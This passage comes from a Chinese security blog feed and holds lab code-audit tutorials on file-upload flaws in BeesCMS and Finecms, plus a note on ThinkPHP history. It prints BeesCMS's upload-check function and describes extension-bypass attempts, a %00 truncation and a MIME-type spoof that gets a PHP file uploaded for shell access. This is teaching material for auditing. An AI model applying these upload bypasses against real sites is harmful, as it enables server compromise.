src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618124823617.png" alt="image-20220618124823617"></p><p>2、readme文件查看：<br><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618124905138.png" alt="image-20220618124905138"></p><h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p>ThinkPHP网上的历史版本的漏洞：</p><p><img src="/2022/06/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-TP5%E6%A1%86%E6%9E%B61/image-20220618131214231.png" alt="image-20220618131214231"></p><p>ThinkPHP-Vuln：</p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>如果发现thinkPHP框架，可能存在以下思路：</p><p>1、如果按照thinkPHP去写，就是thinkPHP的框架漏洞；</p><p>2、如果虽然存在thinkPHP框架，但是没有利用框架，就是常规的审计思路。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计-PHP框架MVC类上传断点调试挖掘</title>
      <link href="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/"/>
      <url>/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00-关键字搜索"><a href="#0x00-关键字搜索" class="headerlink" title="0x00 关键字搜索"></a>0x00 关键字搜索</h2><p>函数，键字，全局变量等</p><p>文件上传的相关函数：move_uploaded_file 等；</p><p>文件上传的关键字：在写上传的时候会有注释，如&#x2F;&#x2F;上传；</p><p>全局变量$_FILES‘</p><p>应用功能抓包：（任何可能存在上传的应用功能点），前台会员中心，后台新闻添加等可能存在上传的地方。</p><p>PHP$_FILES函数：</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220613103847741.png" alt="image-20220613103847741"></p><p>参考文章：<br><a href="https://blog.csdn.net/haoyunyun888/article/details/81079274">https://blog.csdn.net/haoyunyun888/article/details/81079274</a></p><h2 id="0x01-MVC-开发框架类"><a href="#0x01-MVC-开发框架类" class="headerlink" title="0x01 MVC 开发框架类"></a>0x01 MVC 开发框架类</h2><p>MVC架构图解：</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/web_mvc.gif" alt="MVC流程图"></p><p>参考文章：</p><p><a href="https://www.cnblogs.com/wsybky/p/8638876.html">https://www.cnblogs.com/wsybky/p/8638876.html</a></p><h2 id="0x02-Thinkphp框架"><a href="#0x02-Thinkphp框架" class="headerlink" title="0x02 Thinkphp框架"></a>0x02 Thinkphp框架</h2><p>参考文章：<br><a href="https://sites.thinkphp.cn/1556331">https://sites.thinkphp.cn/1556331</a></p><h2 id="0x03-BeesCMS无框架后台任意文件上传"><a href="#0x03-BeesCMS无框架后台任意文件上传" class="headerlink" title="0x03 BeesCMS无框架后台任意文件上传"></a>0x03 BeesCMS无框架后台任意文件上传</h2><h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>思路：搜索$_FILES-&gt;后台中心-&gt;上传图像-&gt;跟踪代码-&gt;逻辑判断</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>打开靶场首页：<br><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614100822444.png" alt="image-20220614100822444"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>将源码载入到审计工具中：<br><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614100856565.png" alt="image-20220614100856565"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>这里先使用搜索关键字进行查找相关功能点，搜索上传：</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614101034190.png" alt="image-20220614101034190"></p><p>有很多文件，截图只截了一部分，不便于查找，改搜索$_FILES：</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614101201626.png" alt="image-20220614101201626"></p><p>这里只有几个文件；并且根据文件的名字可以猜测是后台的文件上传。</p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>随便打开一个文件查看，都是处理上传文件的过程：<br><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614101519476.png" alt="image-20220614101519476"></p><p>浏览器访问其文件，可以看到有上传的功能点：<br><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614101706010.png" alt="image-20220614101706010"></p><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>先上传一个文件抓个包：<br><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614102201599.png" alt="image-20220614102201599"></p><p>数据包中有参数file_info,uppic：</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614102437408.png" alt="image-20220614102437408"></p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614102418177.png" alt="image-20220614102418177"></p><p>在源码中找到这两个参数进行审计：<br><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614103100992.png" alt="image-20220614103100992"></p><p>首先uppic使用post方式接收数据赋值给submit，如果submit存在数据，参数up使用post方式接收数据赋值给变量up，file_info利用post接收数据在利用fl_html()函数转化为html格式赋值给变量$file_info，变量$value_arr使用array()函数存储数组；explode()函数将文件类型以<code>|</code>分割为数组，—is_uploaded_file()函数检查指定的文件是否是通过 HTTP POST 上传的。如果文件是通过 HTTP POST 上传的返回 TRUE,可以用来确保恶意的用户无法欺骗脚本去访问本不能访问的文件。$_FILES<code>[&#39;up&#39;][&#39;tmp_name&#39;]</code>是is_uploaded_file()要检查的文件，up是要上传的表单名，tmp_name变量中的值就是文件在Web服务器中临时存储的位置（上传文件的临时保存文件），确定文件的大小限度（这里是系统设置的值），up_file处理上传的文件，并且验证是否符合上传标准根据up_file返回值（返回的字典形式）确定文件的路径、扩展名、大小、时间，最后在进行数据库的插入操作。</p><p>涉及函数：</p><p>is_uploaded_file() 函数：检查指定的文件是否是通过 HTTP POST 上传的。如果文件是通过 HTTP POST 上传的，该函数返回 TRUE。</p><p>pathinfo() 函数以数组的形式返回关于文件路径的信息。</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614105551883.png" alt="image-20220614105551883"></p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614111248077.png" alt="image-20220614111248077"></p><p>up_file()函数：（自定义函数）判断文件的大小，路径扩展名等。</p><pre class="line-numbers language-none"><code class="language-none">function up_file($file,$size,$type,$path&#x3D;&#39;&#39;,$name&#x3D;&#39;&#39;)&#123;$return_arr&#x3D;array();if(is_uploaded_file($file[&#39;tmp_name&#39;]))&#123;if($file[&#39;size&#39;]&gt;$size)&#123;msg(&#39;文件超过&#39;.$size.&#39;大小&#39;);&#125;$pic_name&#x3D;pathinfo($file[&#39;name&#39;]);$file_type&#x3D;$pic_name[&#39;extension&#39;];$return_arr[&#39;ext&#39;] &#x3D; $pic_name[&#39;extension&#39;];&#x2F;&#x2F;扩展名$return_arr[&#39;size&#39;] &#x3D; $file[&#39;size&#39;];&#x2F;&#x2F;大小if(!in_array($file_type,$type))&#123;msg(&#39;上传文件格式不正确&#39;.$file_type);&#125;$path&#x3D;empty($path)?CMS_PATH.&quot;upload&#x2F;file&#x2F;&quot;:CMS_PATH.$path.&#39;&#x2F;&#39;;if(!file_exists($path))&#123;@mkdir($path);&#125;$name&#x3D;$pic_name[&#39;filename&#39;].&#39;-&#39;.date(&#39;YmdHis&#39;);$name2&#x3D;iconv(&#39;UTF-8&#39;,&#39;GBK&#39;,$name);$file_name&#x3D;$path.$name2.&#39;.&#39;.$pic_name[&#39;extension&#39;];$file_name2&#x3D;$path.$name.&#39;.&#39;.$pic_name[&#39;extension&#39;];if(file_exists($file_name))&#123;msg(&#39;已经存在该附件，请更改附件名称！&#39;);&#x2F;&#x2F;判断是否重名&#125;unset($pic_name);if(!move_uploaded_file($file[&#39;tmp_name&#39;],$file_name))&#123;msg(&#39;文件上传失败&#39;);&#125;$return_name&#x3D;str_replace(CMS_PATH,&quot;&quot;,$file_name2);&#x2F;&#x2F;$return_name&#x3D;CMS_SELF.$return_name;$return_arr[&#39;file&#39;] &#x3D; $return_name;&#x2F;&#x2F;上传文件路径$return_arr[&#39;time&#39;] &#x3D; time();&#x2F;&#x2F;上传时间&#125;else&#123;msg(&#39;文件不能为空&#39;);&#125;&#x2F;&#x2F;存储相关信息return $return_arr;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> explode() 函数：使用一个字符串分割另一个字符串，并返回由字符串组成的数组。</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614104132737.png" alt="image-20220614104132737"></p><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>将数据包放出去后查看返回信息，上传文件格式不正确。<br><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614105650535.png" alt="image-20220614105650535"></p><p>up_file()函数定义返回数据包的结果，刚才的提示应该就是这段代码处理的：</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614105745007.png" alt="image-20220614105745007"></p><p>确定一下报错信息是否在这个代码段，加一个x在后面，再查看报错信息：<br><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614105927939.png" alt="image-20220614105927939"></p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614110044649.png" alt="image-20220614110044649"></p><p>可以看到报错信息有x，可以确定报错代码段就是up_file函数段，那这里绕过拓展名就可以达到上传的目的。</p><p>pathinfo()函数接受文件名赋值给pic_name，pic_name又将文件的拓展名extension截取到赋值给file_type：</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614110502104.png" alt="image-20220614110502104"></p><p>之后file_type接受的文件名不在所定义的文件名中就会报错：</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614110323811.png" alt="image-20220614110323811"></p><h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><p>这里尝试绕过pathinfo()函数的后缀名检测：只要接收的后缀名能够是自定义的即可进行绕过，但根据测试来看，pathinfo()函数只接收最后一个<code>.</code>之后的后缀名，导致无法添加多个后缀名绕过：</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614111633265.png" alt="image-20220614111633265"></p><p>尝试00截断，先上传一个符合要求的后缀名文件，之后添加<code>.php%00</code>（由于是post方式提交，这里的%00需要编码），放包之后回显还是报错，并且结果是php后缀名的报错，证明截断成功了，但是接受的是php文件，导致又被过滤上传失败，这个地方绕过不了。</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614112913552.png" alt="image-20220614112913552"></p><h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><p>换一个$_FILES函数存在的文件（admin_pic_upload.php：<br><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614114023164.png" alt="image-20220614114023164"></p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614114035955.png" alt="image-20220614114035955"></p><p>找到过滤代码函数up_img()，定位：<br><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614114148066.png" alt="image-20220614114148066"></p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614114241047.png" alt="image-20220614114241047"></p><p>这里只判断了图片大小和格式，并且只判断了上传图片的格式，如果图片格式正确可以实现绕过。（MIME类型）</p><h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><p>浏览器打开访问地址：</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614114953808.png" alt="image-20220614114953808"></p><p>上传文件测试，可以看到有返回路径：<br><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614115352164.png" alt="image-20220614115352164"></p><h3 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h3><p>修改后缀上传php文件，放包：</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614115751428.png" alt="image-20220614115751428"></p><p>打开文件路径可以看到php文件上传成功，之后使用连接工具可以进行获取权限。</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614115741878.png" alt="image-20220614115741878"></p><p>这里就挖到了文件上传漏洞。</p><h2 id="0x04-PHPStorm-Xdebug断点调试"><a href="#0x04-PHPStorm-Xdebug断点调试" class="headerlink" title="0x04 PHPStorm+Xdebug断点调试"></a>0x04 PHPStorm+Xdebug断点调试</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>使用PHPStorm+Xdebug断点调试配置教程和下载地址：</p><p>Xdebug下载地址： </p><p><a href="https://xdebug.org/download/historical">https://xdebug.org/download/historical</a></p><p>PhpStorm+Xdebug+phpstudy配置教程（很细的一篇教程）：</p><p><a href="https://blog.csdn.net/weixin_41707419/article/details/123662603">https://blog.csdn.net/weixin_41707419/article/details/123662603</a></p><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>配置完成环境后，使用phpstorm加载项目：<br><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614170123734.png" alt="image-20220614170123734"></p><p>打开监听端口，点击调试：</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614183007629.png" alt="image-20220614183007629"></p><h3 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h3><p>可以看到test正在调试，url的路径出现xdebug的参数，并且自动在浏览器打开相应页面，之后可以使用步入键等一步一步查看代码运行过程：</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614185413592.png" alt="image-20220614185413592"></p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614185440394.png" alt="image-20220614185440394"></p><p>箭头向下是步入下一步，第二个是强制步入，箭头向上是跳出，点击向下的箭头，会依次执行函数和文件（包括文件包含的文件的每一步）。</p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>断点调试优点：</p><p>1、不需要看懂代码，就知道经历了那些函数，和涉及的参数</p><p>2、这里的抓包是从代码层面</p><p>3、主要运用在Java，因为Java框架比较多，很可能看不懂，在这里就需要运用到断点调试</p><h2 id="0x05-Finecms基于前台MVC任意文件上传"><a href="#0x05-Finecms基于前台MVC任意文件上传" class="headerlink" title="0x05 Finecms基于前台MVC任意文件上传"></a>0x05 Finecms基于前台MVC任意文件上传</h2><h3 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h3><p>打开靶场，点击会员中心：<br><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614191032509.png" alt="image-20220614191032509"></p><p>有上传头像的功能，可以测试是否存在文件上传漏洞。</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614191043549.png" alt="image-20220614191043549"></p><h3 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h3><p>上传文件抓包，（基于MVC的框架网站）</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614191416832.png" alt="image-20220614191416832"></p><h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h3><p><strong>MVC简介：</strong></p><p>1、模型Model：管理大部分的业务逻辑和所有的数据库逻辑。模型提供了连接和操作数据库的抽象层。</p><p>2、控制器Controller - 负责响应用户请求、准备数据，以及决定如何展示数据。</p><p>3、视图View – 负责渲染数据，通过HTML方式呈现给用户</p><p><strong>一个典型的Web MVC流程：</strong></p><p>1、Controller截获用户发出的请求；</p><p>2、Controller调用Model完成状态的读写操作；</p><p>3、Controller把数据传递给View；</p><p>4、View渲染最终结果并呈献给用户.</p><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>数据包中s&#x3D;member，c&#x3D;account，m&#x3D;upload这些参数在index.php代码中去找：</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614192035084.png" alt="image-20220614192035084"></p><p>index.php没有找到s,c,m接收参数的代码，这就是典型的MVC的框架，即核心代码没有在指向文件里面，需要查看入口文件；这里的入口文件，FCPPATH(后面有一个fineCMS的目录)和WEBPATH，包含了init.php文件(FCPPATH为定义的路径)；</p><h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p>查看finecms目录，有init.php文件和三个文件夹：<br><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614192507065.png" alt="image-20220614192507065"></p><p>打开init.php文件：<br><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614192529884.png" alt="image-20220614192529884"></p><p>这里system目录下就是框架的代码，dayrui是二次开发的代码；</p><p>根据路由规则匹配参数（也就是传递参数的规则）</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614192903976.png" alt="image-20220614192903976"></p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614193317690.png" alt="image-20220614193317690"></p><p>这段代码看到s，c，m这三个参数，看到相应目录；数据包中的<strong>s对应目录</strong>，<strong>c对应文件名</strong>,<strong>m对应方法</strong>。</p><h3 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h3><p>在MVC框架内的controller中，查找member目录，文件名为account，函数为upload（一般核心代码都在控制器里面）</p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614193202538.png" alt="image-20220614193202538"></p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614193428734.png" alt="image-20220614193428734"></p><p><img src="/2022/06/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%A1%86%E6%9E%B6MVC%E7%B1%BB%E4%B8%8A%E4%BC%A0%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E6%8C%96%E6%8E%98/image-20220614194116520.png" 